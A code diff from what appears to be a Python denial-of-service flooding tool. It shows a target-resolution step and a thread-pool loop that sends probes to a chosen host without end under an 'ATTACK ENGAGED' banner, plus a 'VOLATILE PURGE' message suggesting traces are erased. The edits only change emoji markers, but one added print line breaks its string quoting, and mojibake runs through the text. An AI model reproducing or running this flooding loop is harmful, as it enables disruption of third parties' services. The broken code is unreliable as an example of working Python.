@@ -144,11 +144,11 @@ def print_summary():
     print("\n[🇵🇸] TARGET PROTOCOL DISTRIBUTION:")
     for status, count in SESSION_METRICS["http_status_distribution"].items():
         if count > 0:
-            marker = "🇵🇸" if "200" in status else ("🇵🇸¸" if "400" in status or "Dropped" in status else "🇵🇸‘")
+            marker = "🇵🇸," if "200" in status else ("🇵🇸¸" if "400" in status or "Dropped" in status else "🇵🇸‘")
             print(f"  {marker} {status}: {count} responses")
 
     print("=" * 65)
-    print("🇵🇸¨ [VOLATILE PURGE] Memory registers wiped cleanly. Session matrices dissolved.")
+    print("🇵🇸," [VOLATILE PURGE] Memory registers wiped cleanly. Session matrices dissolved.")
 
 def main():
     print_banner()
@@ -164,7 +164,7 @@ def main():
         target_ip = socket.gethostbyname(host)
         net_type = analyze_network_type(target_ip)
     except socket.gaierror:
-        print("🇵🇸 [NET_FAILURE] Host resolution failed. Target isolated or offline.")
+        print("🇵🇸, [NET_FAILURE] Host resolution failed. Target isolated or offline.")
         return
 
     # User Configuration Input Engine
@@ -191,12 +191,12 @@ def main():
     try:
         with ThreadPoolExecutor(max_workers=threads) as executor:
             if infinite_packets:
-                print("🇵🇸 [ATTACK ENGAGED] Continuous transmission online. Strike [Ctrl+C] to compile final data telemetry...\n")
+                print("🇵🇸, [ATTACK ENGAGED] Continuous transmission online. Strike [Ctrl+C] to compile final data telemetry...\n")
                 while True:
                     executor.submit(execute_network_probe, host, port, scheme, path, timeout, net_type)
                     time.sleep(0.001)  # Mitigates processor starvation
             else:
-                print("🇵🇸 [ATTACK ENGAGED] Finite transmission online.\n")
+                print("🇵🇸, [ATTACK ENGAGED] Finite transmission online.\n")
                 futures = [executor.submit(execute_network_probe, host, port, scheme, path, timeout, net_type) for _ in range(total_packets)]
                 for future in futures:
                     future.result()
